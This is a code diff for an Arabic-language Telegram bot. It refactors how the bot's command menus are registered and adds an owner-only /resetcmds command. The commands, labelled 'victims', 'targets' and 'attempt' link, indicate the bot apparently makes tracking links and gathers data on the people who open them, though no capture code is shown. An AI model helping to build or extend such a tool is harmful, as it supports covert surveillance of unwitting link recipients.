@@ -1381,6 +1381,12 @@ bot.on('message', async (msg) => {
     );
   }
 
+  if (msg.text === "/resetcmds") {
+    if (chatId !== BOT_OWNER) return;
+    await registerBotCommands();
+    return bot.sendMessage(chatId, `✅ تم إعادة تسجيل جميع الأوامر بنجاح!\n\nأغلق قائمة الأوامر ثم افتحها من جديد.`);
+  }
+
   if (msg.text === "/myid")
     return bot.sendMessage(chatId, `🆔 الـ ID الخاص بك:\n\`${chatId}\``, { parse_mode: "Markdown" });
 
@@ -4471,6 +4477,56 @@ require('./link-features')(bot, app, linkMgr, {
   oldLinksDb,
 });
 
+// ── Register bot commands (called on startup + via /resetcmds) ───────────────
+async function registerBotCommands() {
+  // Commands visible to ALL users
+  await bot.setMyCommands([
+    { command: "start",       description: "🚀 ابدأ البوت" },
+    { command: "newlink",     description: "🔗 إنشاء رابط جديد" },
+    { command: "mylinks",     description: "📋 روابطي والتحكم بها" },
+    { command: "attempt",     description: "🎯 رابط محاولة (مرة واحدة)" },
+    { command: "mystats",     description: "📊 إحصائياتي" },
+    { command: "myid",        description: "🆔 معرّفي" },
+    { command: "victims",     description: "👥 زوار رابط معين" },
+    { command: "linkstats",   description: "📊 إحصائيات رابط" },
+    { command: "disablelink", description: "🔴 تعطيل رابط" },
+    { command: "enablelink",  description: "🟢 تفعيل رابط" },
+    { command: "deletelink",  description: "🗑️ حذف رابط" },
+    { command: "help",        description: "📖 المساعدة" }
+  ]).catch(() => {});
+
+  // Extra commands visible ONLY to the bot owner
+  await bot.setMyCommands([
+    { command: "start",         description: "🚀 ابدأ البوت" },
+    { command: "newlink",       description: "🔗 إنشاء رابط جديد" },
+    { command: "mylinks",       description: "📋 روابطي" },
+    { command: "attempt",       description: "🎯 رابط محاولة مجاني (مالك)" },
+    { command: "mystats",       description: "📊 إحصائياتي" },
+    { command: "myid",          description: "🆔 معرّفي" },
+    { command: "victims",       description: "👥 زوار رابط" },
+    { command: "linkstats",     description: "📊 إحصائيات رابط" },
+    { command: "disablelink",   description: "🔴 تعطيل رابط" },
+    { command: "enablelink",    description: "🟢 تفعيل رابط" },
+    { command: "deletelink",    description: "🗑️ حذف رابط" },
+    { command: "help",          description: "📖 المساعدة" },
+    { command: "features",      description: "🎛️ التحكم بالميزات" },
+    { command: "premiumconfig", description: "💎 إعدادات البريميوم المجاني" },
+    { command: "stats",         description: "📊 إحصائيات البوت الكاملة" },
+    { command: "report",        description: "📋 تقرير شامل فوري" },
+    { command: "users",         description: "👥 قائمة المستخدمين" },
+    { command: "top",           description: "🏆 الأكثر نشاطاً" },
+    { command: "premiumlist",   description: "💎 قائمة المشتركين" },
+    { command: "broadcast",     description: "📢 إرسال للجميع" },
+    { command: "silent",        description: "🔕 الوضع الصامت" },
+    { command: "away",          description: "🌙 وضع الغياب" },
+    { command: "setwelcome",    description: "✏️ تخصيص رسالة الترحيب" },
+    { command: "clearstats",    description: "🗑️ مسح الإحصائيات" },
+    { command: "export",        description: "📤 تصدير البيانات" },
+    { command: "ping",          description: "🏓 اختبار السرعة" },
+    { command: "resetcmds",     description: "🔄 إعادة تسجيل الأوامر" }
+  ], { scope: { type: "chat", chat_id: BOT_OWNER } }).catch(() => {});
+}
+
 // ── Notify owner when server starts (after cold start / crash recovery) ───────
 const PORT = process.env.PORT || 5000;
 app.listen(PORT, async () => {
@@ -4483,57 +4539,7 @@ app.listen(PORT, async () => {
   backupCodeToGH().catch(() => {});
 
   setTimeout(() => {
-    // Commands for all users
-    bot.setMyCommands([
-      { command: "start",       description: "ابدأ البوت" },
-      { command: "help",        description: "المساعدة" },
-      { command: "mystats",     description: "إحصائياتي" },
-      { command: "myid",        description: "معرّفي" },
-      { command: "create",      description: "إنشاء رابط (قديم)" },
-      { command: "newlink",     description: "🔗 رابط جديد متقدم" },
-      { command: "mylinks",     description: "📋 روابطي مع التحكم الكامل" },
-      { command: "victims",     description: "👥 زوار رابط معين" },
-      { command: "linkstats",   description: "📊 إحصائيات رابط" },
-      { command: "disablelink", description: "🔴 تعطيل رابط" },
-      { command: "enablelink",  description: "🟢 تفعيل رابط" },
-      { command: "deletelink",  description: "🗑️ حذف رابط" }
-    ]).catch(() => {});
-
-    // Extra commands visible ONLY to the owner
-    bot.setMyCommands([
-      { command: "start",         description: "🚀 ابدأ البوت" },
-      { command: "help",          description: "📖 المساعدة" },
-      { command: "create",        description: "🔗 إنشاء رابط" },
-      { command: "myid",          description: "🆔 معرّفي" },
-      { command: "mystats",       description: "📊 إحصائياتي" },
-      { command: "features",      description: "🎛️ التحكم بالميزات الإضافية" },
-      { command: "premiumconfig", description: "💎 إعدادات البريميوم المجاني" },
-      { command: "stats",         description: "📊 إحصائيات البوت الكاملة" },
-      { command: "report",        description: "📋 تقرير شامل فوري" },
-      { command: "users",         description: "👥 قائمة المستخدمين" },
-      { command: "top",           description: "🏆 الأكثر نشاطاً" },
-      { command: "lastopen",      description: "🕐 آخر فتح للروابط" },
-      { command: "targets",       description: "🎯 الأهداف المراقبة" },
-      { command: "premiumlist",   description: "💎 قائمة المشتركين" },
-      { command: "broadcast",     description: "📢 إرسال رسالة للجميع" },
-      { command: "silent",        description: "🔕 الوضع الصامت" },
-      { command: "away",          description: "🌙 وضع الغياب" },
-      { command: "schedule",      description: "📅 جدولة تقرير يومي" },
-      { command: "setwelcome",    description: "✏️ تخصيص رسالة الترحيب" },
-      { command: "clearstats",    description: "🗑️ مسح الإحصائيات" },
-      { command: "export",        description: "📤 تصدير بيانات المستخدمين" },
-      { command: "ping",          description: "🏓 اختبار السرعة" },
-      { command: "newlink",       description: "🔗 إنشاء رابط جديد متقدم" },
-      { command: "mylinks",       description: "📋 روابطي مع التحكم الكامل" },
-      { command: "victims",       description: "👥 زوار رابط معين" },
-      { command: "linkstats",     description: "📊 إحصائيات رابط" },
-      { command: "linkscount",    description: "🔢 إحصائيات الروابط الكلية" },
-      { command: "linksearch",    description: "🔍 بحث في الروابط" },
-      { command: "disablelink",   description: "🔴 تعطيل رابط" },
-      { command: "enablelink",    description: "🟢 تفعيل رابط" },
-      { command: "deletelink",    description: "🗑️ حذف رابط" }
-    ], { scope: { type: "chat", chat_id: BOT_OWNER } }).catch(() => {});
-
+    registerBotCommands();
     const up = new Date().toISOString();
     bot.sendMessage(BOT_OWNER,
       `✅ البوت اتشغّل الآن\n🕒 ${up}\n💾 البيانات: ${restored > 0 ? `استُعيدت (${restored} ملف)` : 'ملفات جديدة'}`
